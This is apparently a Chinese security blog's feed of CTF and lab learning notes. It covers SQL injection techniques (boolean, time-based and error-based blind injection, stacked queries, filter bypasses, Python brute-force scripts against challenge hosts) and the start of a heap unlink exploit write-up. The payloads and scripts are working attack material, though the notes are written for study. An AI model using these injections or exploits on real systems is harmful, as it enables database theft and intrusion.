<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#users表中的第2列username的长度</span><br><span class="line">AND length((SELECT column_name FROM information_schema.columns WHERE table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; LIMIT 1,1))=8</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>爆各个列名</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#users表中的第3列password的第2个字符的ascii码</span><br><span class="line">AND ascii(substr((SELECT column_name FROM information_schema.columns WHERE table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; LIMIT 2,1),2,1))=97</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>爆字段个数</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND (SELECT count(username) FROM users)=14</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>爆各个字段长度</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#users表中的username列的第1个字段的长度</span><br><span class="line">AND length((SELECT username FROM users LIMIT 0,1))=4</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>爆字段</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND ascii(substr((SELECT username FROM users LIMIT 0,1),1,1))=68</span><br></pre></td></tr></table></figure>

<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>​	时间盲注与布尔盲注相似，不同的是执行正确与否的参考，由是否报错变成了是否执行<code>sleep()</code>函数。测试的核心语句是<code>AND if(查询语句,sleep(3),1)</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND if(length(database())=8,sleep(3),1)</span><br><span class="line">#如果 length(database())=8 为真(1),执行sleep(3)</span><br><span class="line">AND elt(length(database())=8,sleep(3))</span><br><span class="line">#如果 length(database())=8 为真(1),执行sleep(3)</span><br></pre></td></tr></table></figure>

<h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a><code>POST</code></h2><h3 id="Lass-11"><a href="#Lass-11" class="headerlink" title="Lass-11"></a><code>Lass-11</code></h3><p>输入<code>1&#39;</code>回显信息如下，可以推断出传参格式是<code>username=&#39;&#39; and password=&#39;&#39;</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926143.png" alt="image-20241101193611754" style="zoom:50%;" />

<p>输入<code>1&#39; or 1=1#</code>，得<code>username=&#39;1&#39; or 1=1#&#39;</code>，回显正常，<strong>这里用<code>--+</code>注释会失败，要用<code>#</code>注释</strong></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926391.png" alt="image-20241101194908735" style="zoom:50%;" />

<p>接下来就按照<code>Pass-1</code>的思路，使用**<code>union</code>联合查询**注入即可</p>
<h3 id="Lass-12"><a href="#Lass-12" class="headerlink" title="Lass-12"></a><code>Lass-12</code></h3><p>输入<code>1</code>，回显错误，无报错信息</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926822.png" alt="image-20241101200021319" style="zoom: 33%;" />

<p>输入<code>1&#39;</code>，回显错误，无报错信息</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926212.png" alt="image-20241101200059415" style="zoom: 33%;" />

<p>输入<code>1&quot;</code>，回显错误，有报错信息，据此推断出闭合符号为<code>&quot;)</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926637.png" alt="image-20241101200133728" style="zoom:50%;" />

<p>尝试输入<code>1&quot;) or 1=1#</code>，回显正确</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131927444.png" alt="image-20241101200210040" style="zoom:50%;" />

<p>接下来使用**<code>union</code>联合查询**</p>
<h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a><code>Less-17</code></h3><p>​	本题有一个坑，<code>Username</code>中需填入正确的用户名，注入位置在<code>Password</code>处，使用**<code>updatexml()</code>函数报错注入**即可。</p>
<p>但是当我们爆字段时又出现了另一个问题，输入下面<code>payload</code>时</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(username) from users),1,32),0x7e),1)#</span><br></pre></td></tr></table></figure>

<p>有如下报错</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131927184.png" alt="image-20241101212954595" style="zoom:67%;" />

<p>修改<code>payload</code>，使**<code>select</code>的结果再通过一个中间表<code>select</code>多一次**，便可以绕过上面的问题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND updatexml(1,concat(0x7e,substr((SELECT group_concat(username) FROM (SELECT * FROM users) as hmhwazyt5799),1,32),0x7e),1)#</span><br></pre></td></tr></table></figure>

<p>成功返回<code>username</code>字段内容</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131927517.png" alt="image-20241101214340490" style="zoom:50%;" />

<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>往往一次注入后，还要注入第二次才能执行命令。</p>
<p>对于这种</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131919088.png" alt="image-20250111143734313" style="zoom:150%;" />

<p>可以像下面这样注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&quot;||updatexml(1,concat(0x7e,(SELECT(database())),0x7e),1)#</span><br></pre></td></tr></table></figure>

<h2 id="绕过字数限制的一些函数"><a href="#绕过字数限制的一些函数" class="headerlink" title="绕过字数限制的一些函数"></a>绕过字数限制的一些函数</h2><ul>
<li><code>substr</code></li>
<li><code>left</code></li>
<li><strong><code>regexp</code>正则匹配</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select(group_concat(flag))from(users)where(flag)regexp(&#x27;^f&#x27;)</span><br><span class="line">#匹配字符f，并以第一个f开始输出</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>reverse</code>逆转输出</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reverse(select group_concat(flag) from users)</span><br><span class="line">#会倒着从最后一个字符开始输出</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>web安全</category>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入漏洞总结</title>
    <url>/2024/09/15/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>这一篇主要就是总结了一下我在学习sql注入和做相关题目的时候遇到的一些题型、知识点、攻击方法和特别的绕过方法，内容不是很全，但肯定有用😉</p>
<span id="more"></span>

<p>小知识记录：</p>
<ol>
<li><p>空格：<code>()</code>或<code>/**/</code>替代</p>
</li>
<li><p><code>=</code>：<code>like</code>替代</p>
</li>
<li><p><code>%00</code>也可以注释（截断）后面的<code>&#39;</code></p>
</li>
<li><p>replace可以替代insert插入</p>
</li>
<li><p>查询所有库</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata</span><br><span class="line">replace <span class="keyword">into</span> score <span class="keyword">values</span>(&quot;火华&quot;,<span class="number">666</span>,<span class="number">666</span>,<span class="number">666</span>);   #插入数据</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> score <span class="keyword">where</span> listen<span class="operator">=</span><span class="number">11</span>;   #删除数据</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>[网鼎杯 2018]Comment</p>
<p>[网鼎杯2018]Unfinish</p>
<p>注册好之后会自动跳转到登录页面，我们登上去发现我们的用户名出现在了界面上，那么这就很可能是用户明通过登录之后从数据库查询传到index.php页面了，那这就很符合二次注入的点了，我们就只能在注册的时候考虑用户名注入了，那我们就尝试构建一下payload</p>
<pre><code>//注册用户
insert into tables values(&#39;$email&#39;,&#39;$username&#39;,&#39;$password&#39;)
</code></pre>
<h2 id="regexp与like匹配"><a href="#regexp与like匹配" class="headerlink" title="regexp与like匹配"></a><code>regexp</code>与<code>like</code>匹配</h2><h4 id="like匹配"><a href="#like匹配" class="headerlink" title="like匹配"></a><code>like</code>匹配</h4><p>在表<code>t</code>列<code>c</code>中，匹配以<code>f</code>开头；以<code>f</code>结尾；包含<code>f</code>；包含<code>f/l/a</code>的记录。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from t where c like &#x27;f%&#x27;</span><br><span class="line">select * from t where c like &#x27;%f&#x27;</span><br><span class="line">select * from t where c like &#x27;%f%&#x27;</span><br><span class="line">select * from t where c like &#x27;f&#x27; or c like &#x27;l&#x27; or c like &#x27;a&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="regexp正则匹配"><a href="#regexp正则匹配" class="headerlink" title="regexp正则匹配"></a><code>regexp</code>正则匹配</h3><p>在表<code>t</code>列<code>c</code>中，匹配以<code>f</code>开头；以<code>f</code>结尾；包含<code>f</code>的记录。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t <span class="keyword">where</span> c regexp <span class="string">&#x27;^f&#x27;</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t <span class="keyword">where</span> c regexp <span class="string">&#x27;f$&#x27;</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t <span class="keyword">where</span> c regexp <span class="string">&#x27;f&#x27;</span></span><br></pre></td></tr></table></figure>

<p>匹配包含<code>f</code>或<code>l</code>或<code>a</code>的记录</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t <span class="keyword">where</span> c regexp <span class="string">&#x27;f|l|a&#x27;</span></span><br></pre></td></tr></table></figure>

<p>匹配包含<code>ae/be/ce/de</code>的记录；匹配包含<code>ea/eb/ec/ed</code>的记录</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t <span class="keyword">where</span> c regexp <span class="string">&#x27;[abcd]e&#x27;</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t <span class="keyword">where</span> c regexp <span class="string">&#x27;e[abcd]&#x27;</span></span><br></pre></td></tr></table></figure>

<p>使用<code>-</code>进行范围匹配搜索</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t <span class="keyword">where</span> c regexp <span class="string">&#x27;[a-d]e&#x27;</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t <span class="keyword">where</span> c regexp <span class="string">&#x27;e[a-d]&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="regexp盲注脚本"><a href="#regexp盲注脚本" class="headerlink" title="regexp盲注脚本"></a><code>regexp</code>盲注脚本</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">from urllib.parse import unquote</span><br><span class="line">def Regexp(url):</span><br><span class="line">    passwd = &#x27;&#x27;</span><br><span class="line">    string = &#x27;qwertyuioplkjhgfdsazxcvbnm1234567890_-&#123;&#125;~&#x27;</span><br><span class="line">    for num in range(50):</span><br><span class="line">        for i in string:</span><br><span class="line">            i = passwd+i #上次匹配到的passwd要带上</span><br><span class="line">            payload = &#x27;||/**/passwd/**/regexp/**/\&quot;^&#123;0&#125;\&quot;;&#x27;.format(i)+unquote(&#x27;%00&#x27;)</span><br><span class="line">            post_data = &#123;&#x27;username&#x27;:&#x27;\\&#x27;,&#x27;passwd&#x27;:payload&#125;</span><br><span class="line">            res = requests.post(url=url,data=post_data)</span><br><span class="line">            if &quot;welcome&quot; in res.text:</span><br><span class="line">                passwd = i</span><br><span class="line">                print(passwd)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    url = &#x27;http://48723e94-4934-4e93-a309-206c8f2713b2.node5.buuoj.cn:81/&#x27;</span><br><span class="line">    Regexp(url)</span><br></pre></td></tr></table></figure>

<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p><a href="https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8">[强网杯 2019]随便注</a>、<a href="https://buuoj.cn/challenges#[GYCTF2020]Blacklist">[GYCTF2020]Blacklist</a></p>
<h4 id="show查询"><a href="#show查询" class="headerlink" title="show查询"></a><code>show</code>查询</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show databases;</span><br><span class="line">show tables from information_schema;</span><br><span class="line">show columns from table1;</span><br><span class="line">#如果表名是纯数字，需要用反引号包裹</span><br><span class="line">show columns from `5799`</span><br></pre></td></tr></table></figure>

<h4 id="重命名获取字段内容"><a href="#重命名获取字段内容" class="headerlink" title="重命名获取字段内容"></a>重命名获取字段内容</h4><p>​	这个方法比较绕，大致思路如下：通常输入<code>1</code>能获取一个普通的字段内容，这里输入<code>1</code>可以获取<em>words</em> 表<em>id</em> 字段中的数据，我们要的<em>flag</em> 在<em>flag_table</em> 表<em>flag</em> 字段中。然后将原来的表和列改为其他名字，将<em>flag</em> 的表和列改为<em>word</em> 和<em>id</em>，如此直接输入<code>1</code>便能查询到<em>flag</em>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 1&#x27;;payload#</span><br><span class="line">#payload如下</span><br><span class="line">alter table words rename to words1;</span><br><span class="line">alter table flag_table rename to words;</span><br><span class="line">alter table words change flag id varchar(60);</span><br><span class="line">1&#x27;;alert table words rename to www;alter table 1919810931114514 rename to words;alert table words change flag id varchar(60);</span><br></pre></td></tr></table></figure>

<h4 id="handler查表"><a href="#handler查表" class="headerlink" title="handler查表"></a><code>handler</code>查表</h4><p>​	<code>handler</code>用来读表中的数据，会根据语句后面的参数决定。需要注意的是，在用<code>handler</code>读取表中数据的时候，需要先<code>open</code>一个表，然后才能<code>read</code>，最后还需要<code>close</code>。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">HANDLER demo <span class="keyword">OPEN</span>;</span><br><span class="line">HANDLER demo READ&#123;<span class="keyword">FIRST</span> <span class="operator">|</span> <span class="keyword">LAST</span> <span class="operator">|</span> NEXT <span class="operator">|</span> PREV&#125;;</span><br><span class="line">HANDLER demo <span class="keyword">CLOSE</span>;</span><br><span class="line">#<span class="keyword">first</span>：读取第一行数据。</span><br><span class="line">#<span class="keyword">last</span>：读取最后一行的数据，需要一个合适的索引。</span><br><span class="line">#next：读取当前行的下一行数据。</span><br><span class="line">#prev：读取当前数据的前一行</span><br><span class="line">handler FlagHere <span class="keyword">open</span>;handler FlagHere read <span class="keyword">first</span>;handler FlagHere <span class="keyword">close</span>;</span><br></pre></td></tr></table></figure>

<h2 id="过滤information"><a href="#过滤information" class="headerlink" title="过滤information"></a>过滤<code>information</code></h2><h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><ul>
<li><strong><code>mysql.innodb.table.stats</code><strong>和</strong><code>database_name=&quot;&quot;</code></strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT group_concat(table_name) FROM mysql.innodb_table_stats WHERE database_name=database()</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>sys.schema_table_statistics_with_buffer</code></strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT group_concat(table_name) FROM sys.schema_table_statistics_with_buffer WHERE table_schema=</span><br></pre></td></tr></table></figure>

<h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><p><strong>注</strong>：这个方法必须当<code>union</code>没有被过滤时才能利用。</p>
<p><code>table0</code>中有<code>3</code>个字段(列)，输入以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1,2,3 union select * from table0</span><br></pre></td></tr></table></figure>

<p>会得到如下内容</p>
<table>
<thead>
<tr>
<th><code>1</code></th>
<th><code>2</code></th>
<th><code>3</code></th>
</tr>
</thead>
<tbody><tr>
<td><code>linyue</code></td>
<td><code>2333</code></td>
<td><code>happy</code></td>
</tr>
<tr>
<td><code>jiantang</code></td>
<td><code>5799</code></td>
<td><code>fine</code></td>
</tr>
</tbody></table>
<p>这样就获得了一张新表<code>table1</code>，其字段名是<code>1 2 3</code>，内容还是<code>table0</code>中原来的内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 获取第一列的内容</span><br><span class="line">select `1` from (select 1,2,3 union select * from table0)table1</span><br></pre></td></tr></table></figure>

<p>如果过滤了反引号，使用如下方法绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#获取第一列的内容</span><br><span class="line">select a from (select 1 as a union select * from table2)table3</span><br><span class="line">#获取第三列的内容</span><br><span class="line">select b from (select 1,2,3 as b union select * from table0)table1</span><br></pre></td></tr></table></figure>

<h4 id="ascii比较"><a href="#ascii比较" class="headerlink" title="ascii比较"></a><code>ascii</code>比较</h4><p>查询字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">((select 1,2,3)&gt;(select * from f1ag_1s_h3r3_hhhhh))</span><br></pre></td></tr></table></figure>

<p>1，2，3或1，2这样不断尝试，根据回显确定字段数。</p>
<p>直接给脚本吧😅</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Flag</span>(<span class="params">url</span>):</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    flag_1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            flag_1 = (flag+<span class="built_in">chr</span>(char)) <span class="comment">#上次得到的flag加上这次要遍历的字符</span></span><br><span class="line">            payload = <span class="string">&#x27;2||((select 1,&quot;&#123;0&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span>.<span class="built_in">format</span>(flag_1)</span><br><span class="line">            post_data = &#123;<span class="string">&quot;id&quot;</span>:payload&#125;</span><br><span class="line">            res = requests.post(url,post_data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Nu1L&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                flag += <span class="built_in">chr</span>(char-<span class="number">1</span>) <span class="comment">#fl与flag比较，fm与flag比较</span></span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&#x27;http://2d5d6e3c-1b0a-477e-9096-89fab93ce204.node5.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line">    <span class="comment"># Database_Length(url)</span></span><br><span class="line">    <span class="comment"># Database(url)#give_grandpa_pa_pa_pa</span></span><br><span class="line">    <span class="comment"># Table(url)#users233333333333333,f1ag_1s_h3r3_hhhhh</span></span><br><span class="line">    Flag(url)</span><br></pre></td></tr></table></figure>

<h2 id="addslashes-和str-replace-过滤"><a href="#addslashes-和str-replace-过滤" class="headerlink" title="addslashes()和str_replace()过滤"></a><code>addslashes()</code>和<code>str_replace()</code>过滤</h2><p>例题：[CISCN2019 总决赛 Day2 Web1]Easyweb<br><code>GET</code>传入<code>id</code>和<code>path</code>两个参数。</p>
<h3 id="过滤分析"><a href="#过滤分析" class="headerlink" title="过滤分析"></a>过滤分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>addslashes($id)</code>函数，会在**$id**中的特殊字符前，添加反斜杠，这些特殊字符为：<code>&#39;</code>、<code>&quot;</code>、<code>\</code>、<code>NULL</code>字符(<code>\0</code>)。</li>
<li><code>str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);</code>会将**$id<strong>中的<code>\0</code>、<code>%00</code>、<code>\&#39;</code>、<code>&#39;</code>都替换为空字符串。<code>\\0</code>是</strong>NULL<strong>字符（<code>\0</code>），<code>\\&#39;</code>是转义的单引号<code>\&#39;</code>，<code>%00</code>是</strong>URL<strong>编码的</strong>NULL**字符。</li>
</ul>
<p>转义字符是什么意思？</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># echo &#x27;I&#x27;m happy.&#x27;;   （1）</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;I\&#x27;m happy.&#x27;</span>;    （<span class="number">2</span>）</span><br></pre></td></tr></table></figure>

<p>​	<code>(1)I&#39;m</code>中的<code>&#39;</code>被解释为字符串的结束符；<code>(2)I\&#39;m</code>中的<code>\&#39;</code>被解释为一个单引号字符，有了<code>\</code>的转义，才不会被解释为结束符。</p>
<h3 id="绕过分析"><a href="#绕过分析" class="headerlink" title="绕过分析"></a>绕过分析</h3><p>​	如果输入<code>$id=\0</code>，<strong>addslashes()<strong>使其为<code>\\0</code>，</strong>str_replace()<strong>过滤其中的<code>\0</code>，最后剩下一个<code>\</code>。放入原语句<code>id=&#39;&#123;$id&#125;&#39; or path=&#39;&#123;$path&#125;&#39;</code>中，成为<code>id=&#39;\&#39; or path=&#39;&#123;$path&#125;&#39;</code>，如此以来，第二个原本为</strong>结束符</strong>的单引号被转义为<strong>单引号字符</strong>，而第三个原本为<strong>起始符</strong>的单引号便成了<strong>结束符</strong>。</p>
<p>​	如果输入<code>http://65e65fa9-e2cc-4aba-8ce5-41cee1623c5e.node5.buuoj.cn:81/image.php?id=1\0&amp;path=or 1=1#</code>，则构成的<code>sql</code>语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from images where id=&#x27;1\&#x27; or path=&#x27;or 1=1#&#x27;</span><br></pre></td></tr></table></figure>

<p>原意是由<code>or</code>连接的<code>id</code>和<code>path</code>两个条件，通过恶意注入成了由<code>or</code>连接的<code>id</code>和<code>1=1</code>这两个条件。</p>
<p>​	现在，参数<code>id</code>传入<code>1\0</code>；参数<code>path</code>传入<code>or xxxx#</code>，构成的<code>sql</code>语句中，<code>1\&#39; or path=</code>无用，<code>or xxxx#</code>中的<code>xxxx#</code>才是真正要利用的代码。</p>
<p>注：如果没有过滤，通常我们只需输入<code>1&#39;</code>，由输入的<code>&#39;</code>提前闭合，便可以完成注入。而这次我们是利用过滤将原来的结束符转义，再结合第二个条件的开始符来完成注入。</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>unlink学习笔记</title>
    <url>/2024/10/13/unlink%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>[TOC]</p>
<span id="more"></span>

<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h3><p>假设我们称，指向_chunk_的指针区域，为_chunk_hook_区域。</p>
<p>_unlink_的目的就是，使某个_chunk_hook_指向一个_chunk_hook_，也就是使_chunk_hook_区域可以作为一个_chunk_，这样就可以对_chunk_hook_区域进行任意泄漏和写，进而也就能对其他地址进行任意泄漏和写。</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul>
<li><p>将<strong>要被合并的正序第一个</strong>的_chunk_，称**<code>unlink_chunk</code><strong>；指向_free_chunk_的指针，称</strong><code>unlink_chunk_hook</code>**，则：<br><code>fd = unlink_chunk_hook - 0x18</code><br><code>bk = unlink_chunk_hook - 0x10</code></p>
</li>
<li><p>将要<code>free</code>的_chunk_，称**<code>inuse0_chunk</code><strong>，<code>inuse0_chunk</code>的<code>prev_size</code>字段，表示前面所有空闲（</strong>要被合并**）的_chunk_的<code>user_data_size</code>。<br><code>inuse0_chunk_prev_size = all_chunk_user_data_size</code></p>
</li>
</ul>
<p>_unlink_后，_unlink_chunk_hook_成功指向<code>fd</code>。</p>
<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>能使一个_chunk_处于_free_状态，并且能控制该_chunk_的_user_data_字段。</p>
<ol>
<li>堆溢出，能自由向该_chunk_的_user_data_中输入数据，并能溢出使后一个_chunk_的_prev_inuse_位为<code>0</code>。此时该_chunk_处于_free_状态。</li>
<li>_uaf_漏洞。</li>
</ol>
<p>能使后一个_chunk_被<code>free</code>的时候，被放到_unsorted bin_中。</p>
<ol>
<li>当没有_tcache_时，_chunk_的大小需大于_fast bin_的范围</li>
</ol>
<h2 id="hitcontraining-bamboobox"><a href="#hitcontraining-bamboobox" class="headerlink" title="hitcontraining_bamboobox"></a><em>hitcontraining_bamboobox</em></h2><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>在_change_item_函数中，有堆溢出漏洞。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252040819.png" alt="1"></p>
<h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><h4 id="确定-unlink-chunk-hook"><a href="#确定-unlink-chunk-hook" class="headerlink" title="确定_unlink_chunk_hook_"></a>确定_unlink_chunk_hook_</h4><p>申请<code>3</code>个_chunk_，_chunk0_作为_unlink_chunk_。_chunk_1_用来使_chunk0_处于空闲状态，并合并_chunk0_。_chunk2_用来防止释放_chunk1_后，_chunk1_与_Top chunk_合并。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)   <span class="comment">#后面执行system的时候会用到</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252040873.png" alt="image-20240721194438119"></p>
<p>如图，在_chunk_hook_区域找到_unlink_chunk_hook_，并计算出_fd_和_bk_：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">unlink_chunk_hook = <span class="number">0x6020c8</span></span><br><span class="line">fd = unlink_chunk_hook-<span class="number">0x18</span></span><br><span class="line">bk = unlink_chunk_hook-<span class="number">0x10</span></span><br></pre></td></tr></table></figure>

<h4 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a><em>unlink</em></h4><p>要注意<code>chunk1</code>的<code>prev_size</code>字段，表示前面空闲的<code>chunk</code>的大小</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span>+p64(fd)+p64(bk)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line"><span class="comment">#p64(0x30) 是free_chunk(即chunk0)的user_data字段大小</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x50</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># chunk1的prev_inuse位是0，free掉chunk1后，会向前合并chunk0</span></span><br></pre></td></tr></table></figure>

